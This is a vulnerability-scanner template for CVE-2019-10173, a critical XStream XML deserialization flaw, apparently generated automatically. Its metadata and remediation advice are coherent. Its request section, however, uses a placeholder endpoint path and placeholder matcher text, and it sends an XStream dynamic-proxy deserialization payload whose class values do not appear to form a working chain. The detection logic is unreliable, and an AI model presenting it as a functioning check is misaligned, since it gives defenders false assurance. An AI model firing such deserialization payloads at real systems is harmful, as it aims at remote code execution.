id: CVE-2019-10173

info:
  name: XStream API Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    It was found that xstream API version 1.4.10 before 1.4.11 introduced a regression for a previous deserialization flaw. If the security framework has not been initialized, it may allow a remote attacker to run arbitrary shell commands when unmarshalling XML or any supported format. e.g. JSON. (regression of CVE-2013-7285)
  impact: |
    Remote code execution.
  remediation: |
    Upgrade to XStream version 1.4.11.1 or later.
  reference:
    - http://x-stream.github.io/changes.html#1.4.11
    - https://access.redhat.com/errata/RHSA-2019:3892
    - https://access.redhat.com/errata/RHSA-2019:4352
    - https://access.redhat.com/errata/RHSA-2020:0445
    - https://access.redhat.com/errata/RHSA-2020:0727
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-10173
    cwe-id: CWE-94,CWE-502
    epss-score: 0.93249
    epss-percentile: 0.99176
    cpe: cpe:2.3:a:xstream_project:xstream:1.4.10:*:*:*:*:*:*:*
  metadata:
    vendor: xstream_project
    product: xstream

http:
  - method: POST
    path:
      - "{{BaseURL}}/path/to/vulnerable/endpoint"

    headers:
      Content-Type: application/xml

    body: |
      <sorted-set>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="sun.tracing.NullProvider">
            <provider>com.sun.xml.internal.ws.api.message.Packet@12345678</provider>
          </handler>
        </dynamic-proxy>
      </sorted-set>
    matchers:
      - type: word
        words:
          - "specific error or success message indicating exploitation"
        part: body
